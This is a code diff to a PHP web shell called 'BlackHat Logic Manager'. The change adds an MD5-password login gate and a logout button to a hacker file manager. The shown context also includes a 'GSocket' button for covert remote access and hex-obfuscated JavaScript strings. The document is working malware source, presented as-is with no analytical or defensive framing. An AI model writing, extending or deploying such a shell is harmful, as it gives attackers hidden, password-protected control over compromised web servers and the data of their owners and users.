@@ -4,6 +4,58 @@ session_start();
 $APP_NAME = "BlackHat Logic Manager";
 $BASE_PATH = getcwd();
 
+
+$PASSWORD_MD5 = "a84e5f25e7f6d5de9b82ce3f64d1b8fa";
+
+
+if(isset($_POST['login'])){
+    $pass = $_POST['password'];
+    if(md5($pass) === $PASSWORD_MD5){
+        $_SESSION['logged_in'] = true;
+        header("Location: ".$_SERVER['PHP_SELF']);
+        exit;
+    } else {
+        $msg = "Password salah!";
+    }
+}
+
+
+if(isset($_GET['logout'])){
+    session_destroy();
+    header("Location: ".$_SERVER['PHP_SELF']);
+    exit;
+}
+
+
+if(!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true){
+    ?>
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title><?=$APP_NAME?> - Login</title>
+        <style>
+            body{background:#0d0d0d;color:#eee;font-family:monospace;text-align:center;padding-top:100px;}
+            input{padding:6px;margin:5px;border-radius:4px;border:none;}
+            input[type=password]{width:200px;}
+            input[type=submit]{background:#7d3c98;color:#fff;cursor:pointer;}
+            .msg{color:#e74c3c;margin-top:10px;}
+        </style>
+    </head>
+    <body>
+        <h1><?=$APP_NAME?></h1>
+        <form method="POST">
+            Password: <input type="password" name="password"><br>
+            <input type="submit" name="login" value="Login">
+        </form>
+        <?php if(isset($msg)) echo "<div class='msg'>$msg</div>"; ?>
+    </body>
+    </html>
+    <?php
+    exit;
+}
+
+
+
 function perms($file){ return substr(sprintf('%o', fileperms($file)), -4); }
 function owner($file){
     if(function_exists('posix_getpwuid')){
@@ -277,6 +329,7 @@ function confirmUnzip(filename){return confirm("\x45\x78\x74\x72\x61\x63\x74\x20
 <i class="fas fa-server"></i> <span>Server Information</span>
 </div>
 <span>
+<button type="button" class="server-btn"><a href="?logout=1" style="color:#e74c3c;font-size:14px;">Logout</a></button>
 <form method="POST" style="display:inline;">
     <button type="submit" name="show_gsocket" class="server-btn <?=$showGSocket?'active':''?>">GSocket</button>
 </form>
